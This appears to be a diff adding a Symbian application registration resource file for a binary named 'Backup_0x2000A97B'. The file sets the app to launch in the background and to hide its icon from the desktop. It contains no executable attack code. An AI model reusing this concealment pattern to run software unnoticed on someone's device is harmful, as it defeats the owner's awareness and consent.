@@ -1,0 +1,27 @@
+#include <appinfo.rh>
+#include <Fxs.rsg>
+
+UID2 KUidAppRegistrationResourceFile
+UID3 0x2000A97B
+
+RESOURCE APP_REGISTRATION_INFO
+	  {
+  	  launch = KAppLaunchInBackground;
+	  app_file="Backup_0x2000A97B"; //name of the application binary 
+	  localisable_resource_file =  "\\resource\\apps\\Backup_0x2000A97B";
+	  localisable_resource_id = R_FXS_LOCALISABLE_APP_INFO;
+	  opaque_data = 1;
+	  embeddability = KAppNotEmbeddable;
+	  newfile = KAppDoesNotSupportNewFile;
+	   
+	  //hide application's icon from the desktop
+	  hidden= KAppIsHidden;
+	  }
+
+//
+// Application Capabilities
+//[embeddability= KAppNotEmbeddable | KAppEmbeddable | KAppEmbeddableOnly;]
+//[launch= KAppLaunchInForeground | KAppLaunchInBackground;]
+//[hidden= KAppNotHidden | KAppIsHidden ;]
+//[newfile= KAppDoesNotSupportNewFile | KAppSupportsNewFile;]
+//
